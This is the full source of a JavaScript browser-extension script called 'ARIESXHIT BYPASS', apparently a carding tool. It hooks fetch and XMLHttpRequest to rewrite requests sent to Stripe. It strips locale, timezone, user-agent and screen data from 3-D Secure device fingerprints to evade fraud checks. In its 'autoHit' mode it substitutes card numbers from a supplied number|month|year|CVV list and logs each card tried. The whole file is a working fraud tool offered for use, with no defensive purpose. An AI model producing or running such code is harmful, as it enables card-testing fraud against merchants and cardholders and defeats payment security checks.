// ===================================
// ARIESXHIT BYPASS - v3.0
// Fingerprint removal + card replacement
// Injected into page context
// ===================================

(function () {
  'use strict';
  if (window.__ARIES_BYPASS__) return;
  window.__ARIES_BYPASS__ = true;

  let state = {
    bypassActive: false,
    autoHitActive: false,
    binList: [],
    cardList: [],
  };

  const STRIPE_HOSTS = ['stripe.com', 'stripe.network'];

  function isStripe(url) {
    if (!url) return false;
    try {
      const u = new URL(url, location.href);
      return STRIPE_HOSTS.some((h) => u.hostname.includes(h));
    } catch {
      return STRIPE_HOSTS.some((h) => url.includes(h));
    }
  }

  function sendLog(type, msg) {
    try {
      chrome.runtime.sendMessage({ type: 'LOG', logType: type, message: msg });
    } catch (_) {}
    console.log(`[Bypass] ${msg}`);
  }

  // ----- Fingerprint removal -----
  function decodeAndModify(body) {
    if (!body) return { modified: false, body };

    let result = body;
    let modified = false;

    const localePatterns = [
      /en-US/gi, /en_US/gi, /en-GB/gi, /en_GB/gi,
      /"locale":"[^"]*"/gi,
      /"browser_locale":"[^"]*"/gi,
      /"language":"[^"]*"/gi,
      /locale=[^&]*/gi,
      /browser_locale=[^&]*/gi,
    ];

    for (const p of localePatterns) {
      const before = result;
      result = result.replace(p, '');
      if (before !== result) modified = true;
    }

    const deviceMatch = result.match(/three_d_secure%5Bdevice_data%5D=([^&]*)/);
    if (deviceMatch) {
      try {
        const decoded = decodeURIComponent(deviceMatch[1]);
        const json = atob(decoded);
        const obj = JSON.parse(json);

        const keys = ['browser_locale', 'locale', 'language', 'timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth'];
        keys.forEach((k) => {
          if (k in obj) {
            delete obj[k];
            modified = true;
          }
        });

        const newB64 = btoa(JSON.stringify(obj));
        const newEnc = encodeURIComponent(newB64);
        result = result.replace(deviceMatch[0], `three_d_secure%5Bdevice_data%5D=${newEnc}`);
      } catch (_) {}
    }

    try {
      if (result.startsWith('{') || result.startsWith('%7B')) {
        const jsonStr = result.startsWith('%') ? decodeURIComponent(result) : result;
        const obj = JSON.parse(jsonStr);
        const keys = ['browser_locale', 'locale', 'language', 'timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth'];

        function deepRemove(o) {
          if (typeof o !== 'object' || !o) return;
          keys.forEach((k) => {
            if (k in o) {
              delete o[k];
              modified = true;
            }
          });
          Object.values(o).forEach((v) => {
            if (typeof v === 'object') deepRemove(v);
          });
        }
        deepRemove(obj);
        if (modified) {
          result = JSON.stringify(obj);
          if (body.startsWith('%')) result = encodeURIComponent(result);
        }
      }
    } catch (_) {}

    return { modified, body: result };
  }

  // ----- Card replacement -----
  const TEST_CARDS = [
    { number: '4242424242424242', month: '12', year: '28', cvv: '123' },
    { number: '4000000000000002', month: '12', year: '28', cvv: '123' },
    { number: '5555555555554444', month: '12', year: '28', cvv: '123' },
    { number: '378282246310005', month: '12', year: '28', cvv: '1234' },
  ];

  async function getNextCard() {
    if (state.autoHitActive && state.cardList?.length > 0) {
      const c = state.cardList[Math.floor(Math.random() * state.cardList.length)];
      if (typeof c === 'string') {
        const [n, m, y, cvv] = c.split('|');
        return { number: n, month: m || '12', year: (y || '28').slice(-2), cvv: cvv || '123' };
      }
      return c;
    }
    if (state.bypassActive && state.binList?.length > 0) {
      return TEST_CARDS[Math.floor(Math.random() * TEST_CARDS.length)];
    }
    return null;
  }

  function applyCard(body, card) {
    if (!card) return body;
    let r = body;
    const map = {
      'card[number]': card.number,
      'card[exp_month]': card.month,
      'card[exp_year]': card.year,
      'card[cvc]': card.cvv,
    };
    for (const [k, v] of Object.entries(map)) {
      r = r.replace(new RegExp(`"${k}":"[^"]*"`, 'g'), `"${k}":"${v}"`);
      r = r.replace(new RegExp(`${k.replace(/\[/g, '\\[').replace(/\]/g, '\\]')}=[^&]*`, 'g'), `${k}=${v}`);
    }
    return r;
  }

  function bodyToString(b) {
    if (!b) return '';
    if (typeof b === 'string') return b;
    if (b instanceof URLSearchParams) return b.toString();
    if (b instanceof FormData) {
      const p = new URLSearchParams();
      b.forEach((v, k) => p.append(k, v));
      return p.toString();
    }
    if (b instanceof ArrayBuffer) return new TextDecoder().decode(b);
    try {
      return JSON.stringify(b);
    } catch (_) {
      return '';
    }
  }

  // ----- Fetch -----
  const origFetch = window.fetch;
  window.fetch = async function (input, init) {
    let url, method, headers, body;

    if (input instanceof Request) {
      url = input.url;
      method = input.method;
      headers = new Headers(input.headers);
      body = input.body ? await input.clone().text() : null;
    } else {
      url = String(input || '');
      method = init?.method || 'GET';
      headers = init?.headers ? new Headers(init.headers) : new Headers();
      body = init?.body;
    }

    const bodyStr = bodyToString(body);

    if (isStripe(url) && (state.bypassActive || state.autoHitActive) && bodyStr && method !== 'GET') {
      const bypass = decodeAndModify(bodyStr);
      let finalBody = bypass.body;
      const card = await getNextCard();
      if (card) {
        finalBody = applyCard(finalBody, card);
        sendLog('success', `Card: ${card.number}|${card.month}|${card.year}|${card.cvv}`);
      }

      if (bypass.modified || (card != null)) {
        sendLog('success', 'Request bypassed');
        const opts = { method, headers, body: finalBody, credentials: init?.credentials || 'same-origin', mode: init?.mode || 'cors' };
        return origFetch.call(window, url, opts);
      }
    }

    if (input instanceof Request) return origFetch.call(window, input, init);
    return origFetch.call(window, url, init || {});
  };

  // ----- XHR -----
  const XHR = XMLHttpRequest;
  const origOpen = XHR.prototype.open;
  const origSend = XHR.prototype.send;

  XHR.prototype.open = function (method, url) {
    this._url = String(url || '');
    this._method = method;
    return origOpen.apply(this, arguments);
  };

  XHR.prototype.send = function (body) {
    const url = this._url;
    const method = this._method;
    const bodyStr = bodyToString(body);

    if (isStripe(url) && (state.bypassActive || state.autoHitActive) && bodyStr && method !== 'GET') {
      const bypass = decodeAndModify(bodyStr);
      getNextCard().then((card) => {
        let finalBody = bypass.body;
        if (card) {
          finalBody = applyCard(finalBody, card);
          sendLog('success', `XHR Card: ${card.number}|${card.month}|${card.year}|${card.cvv}`);
        }
        if (bypass.modified || (card != null)) {
          sendLog('success', 'XHR bypassed');
          origSend.call(this, finalBody);
        } else {
          origSend.apply(this, arguments);
        }
      });
      return;
    }

    return origSend.apply(this, arguments);
  };

  // ----- Init -----
  async function init() {
    try {
      const r = await chrome.runtime.sendMessage({ type: 'GET_STATE' });
      if (r) {
        state.bypassActive = r.bypassActive ?? false;
        state.autoHitActive = r.autoHitActive ?? false;
        state.binList = r.binList ?? [];
        state.cardList = r.cardList ?? [];
      }
      sendLog('info', `Bypass ready - ${state.bypassActive ? 'ON' : 'OFF'}`);
    } catch (_) {
      sendLog('info', 'Bypass ready - OFF');
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
